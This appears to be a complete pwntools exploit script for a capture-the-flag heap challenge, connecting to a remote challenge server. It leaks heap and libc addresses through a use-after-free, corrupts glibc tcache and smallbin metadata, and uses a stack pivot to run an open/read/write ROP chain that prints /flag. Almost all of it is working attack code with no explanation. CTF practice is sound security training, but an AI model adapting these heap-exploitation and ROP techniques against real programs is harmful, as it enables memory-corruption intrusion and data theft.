#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:

    p = process('./pwn')

else:
    p = remote('node3.buuoj.cn',28367)

map_1 ={"0x10":"1","0xf0":"2","0x300":"3","0x400":"4"}

def Add(idx,size,content):
    p.recvuntil('Your input: ')
    p.sendline('1')
    p.recvuntil("Please input the red packet idx: ")
    p.sendline(str(idx))
    p.recvuntil("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ")
    p.sendline(map_1[hex(size)])
    p.recvuntil("Please input content: ")
    p.send(content)

def Show(idx):
    p.recvuntil('Your input: ')
    p.sendline('4')
    p.recvuntil("Please input the red packet idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('Your input: ')
    p.sendline('2')
    p.recvuntil("Please input the red packet idx: ")
    p.sendline(str(idx))

def Edit(idx,content):
    p.recvuntil('Your input: ')
    p.sendline('3')
    p.sendlineafter("Please input the red packet idx: ",str(idx))
    p.recvuntil("Please input content: ")
    p.send(content)

def Suprise(content):
    p.recvuntil('Your input: ')
    p.sendline('666')
    p.sendafter("What do you want to say?",content)



def exp():
    #leak heap
    for i in range(0,13):
        Add(i,0x400,str(i))
    for i in range(6):
        Add(13,0xf0,str(13))
        Delete(13)

    Delete(0)
    Delete(1)
    Show(1)
    #leak heap
    heap_base = u64(p.recvline().strip("\n").ljust(8,"\x00")) - (0xa270-0x9000)
    log.success("[*]heap base => " + hex(heap_base))
    #leak libc
    for i in range(2,8):
        Delete(i)
    Show(7)
    libc_base = u64(p.recvline().strip('\n').ljust(8,"\x00")) - (0x7ffff7fb4ca0-0x7ffff7dd0000)
    log.success("libc base => " + hex(libc_base))
    libc.address = libc_base
    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    leave_ret = libc_base + 0x0000000000058373
    #
    #add 6 bins to tcache[0x100]
    #for i in range(8,13):
    #    Delete(i)

    Add(0,0x300,"0")#cut 0x410->0x310+0x100
    Add(1,0x300,"1")#put 0x100 to small bin in order to be in tcache



    Delete(9)#7 & 9
    Add(2,0x300,"2")
    Add(3,0x300,"3")
    #now we write sth

    rop_heap = heap_base+(0x55555555c700-0x555555559000)
    #open
    rops = "/flag\x00\x00\x00"
    rops += p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x30)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x30)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    #rops += p64(libc.sym['write'])
    rops = rops.ljust(0x300,'\x00')




    Edit(9,rops+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c1e0-0x555555559000))+p64(heap_base+(0x555555559a60-0x555555559000)-0x10))


    #gdb.attach(p,'b* 0x0000555555554000 + 0x144d')
    Add(0,0xf0,"1")#put 0x100 to small bin in order to be in tcache
    #now we rop

    payload = "a"*0x80+p64(rop_heap)+p64(leave_ret)
    Suprise(payload)

    p.interactive()

exp()
